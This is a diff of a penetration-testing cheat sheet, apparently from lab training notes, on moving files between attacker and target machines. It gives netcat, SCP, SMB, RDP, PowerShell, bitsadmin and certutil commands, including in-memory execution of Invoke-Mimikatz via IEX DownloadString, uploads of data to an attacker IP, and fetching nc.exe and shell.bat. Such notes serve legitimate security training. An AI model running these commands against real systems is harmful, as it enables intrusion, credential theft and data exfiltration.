@@ -1,39 +1,130 @@
-## Attack Surface
 
-### [[Linux to Linux]]
+## Netcat
 
-- [ ] wget & curl
-- [ ] SCP
-- [ ] Python HTTP Server
-- [ ] Netcat File Transfer
-- [ ] SSH File Transfer
+**Case 1 - Using nc to Upload from attacker to target:**
 
-### [[Linux to Windows]]
+1. From the target machine: `nc -l -p 8000 > SharpKatz.exe`
+2. From attacker machine: `nc -q 0 192.168.49.128 8000 < SharpKatz.exe`
 
-- [ ] Python HTTP Server
-- [ ] SCP to Windows
-- [ ] Impacket SMB Server
-- [ ] Netcat File Transfer
+**Case 2 - Using ncat to Upload from attacker to target:**
 
-### [[Windows to Linux]]
+1. From the target machine: `ncat -l -p 8000 --recv-only > SharpKatz.exe`
+2. From attacker machine: `ncat --send-only target-ip 8000 < SharpKatz.exe`
 
-- [ ] [[Certutil]]
-- [ ] PowerShell WebClient
-- [ ] SMB File Transfer
-- [ ] SCP from Windows
-- [ ] Bitsadmin
-
-### [[Windows to Windows]]
-
-- [ ] SMB File Transfer
-- [ ] PowerShell WebClient
-- [ ] Certutil
-- [ ] RDP Drive Mounting
-- [ ] Bitsadmin
-
-### [[Living Off The Land]]
-
-- [ ] GTFOBins
-- [ ] LOLBAS
 
 ---
+
+# Linux
+
+```sh
+> cat filename | base64 -w 0; echo
+> echo 'encoding-result' | base64 -d
+### Encode and decode a file via base64
+
+> wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
+### Download a file using Wget
+
+> curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+### Download a file using cURL
+```
+
+## Python
+
+```shell
+> python3 -m http.server 8080
+### opens a http server on port 8080
+```
+
+## SCP
+
+``` shell
+> scp C:\Temp\bloodhound.zip user@target-ip:/tmp/bloodhound.zip
+### upload a file using SCP
+
+> scp user@target:/tmp/mimikatz.exe C:\Temp\mimikatz.exe
+### download a file using SCP
+
+```
+
+## SMB Share
+
+```shell
+> sudo impacket-smbserver sharename -smb2support /tmp/smbshare
+### Create an SMB Server with anonymous access
+
+> copy \\server-ip\share\nc.exe
+### Copy file to previous SMB Server when anonymous access is available
+
+> sudo impacket-smbserver sharename -smb2support /tmp/smbshare -user test -password test
+### Create an SMB Server hosting a share named "sharename" with credentials
+
+> net use n: \\server-ip\sharename /user:test test
+### Copy file to previous SMB Server when anonymous access is NOT available
+```
+
+## RDP Shares and Clipboard
+
+Drag and Drop also works.
+
+```sh
+> xfreerdp /v:ip /u:user /p:password +home-drive
+### Create an SMB share containing the user's home drive
+
+> xfreerdp /v:ip_address /u:username /p:password /drive:path/to/directory,share_name
+### Connect to a FreeRDP server with a shared directory
+
+> xfreerdp /v:ip_address /u:username /p:password +clipboard
+### Use RDP clipboard redirection
+```
+
+---
+
+# Windows 
+
+
+```PowerShell
+PS C:\htb> Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1
+### Download a file with PowerShell
+
+PS C:\htb> IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')
+### Execute a file in memory using PowerShell
+
+PS C:\htb> Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64
+### Upload a file with PowerShell
+```
+
+## Bitsadmin
+
+```PowerShell
+PS C:\htb> bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe
+### Download a file using Bitsadmin
+```
+
+## PHP
+
+```PowerShell
+PS C:\htb> php -r '$file = file_get_contents("https://<snip>/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
+### Download a file using PHP
+```
+
+## Chrome User Agent
+
+```PowerShell
+PS C:\htb> Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile "nc.exe"
+### Invoke-WebRequest using a Chrome User Agent
+```
+
+## [Certutil](certutil.exe)
+
+```PowerShell
+PS C:\htb> certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat
+### Downloading a file, we can sue -verifyctl too instead of -urlcache
+
+C:\htb> certutil -encode file1 encodedfile
+C:\htb> certutil -decode encodedfile file2
+### Encoding and Decoding to/from base64
+```
+
+A binary such as [rundll32.exe](https://lolbas-project.github.io/lolbas/Binaries/Rundll32/) can be used to execute a DLL file.
+
+***
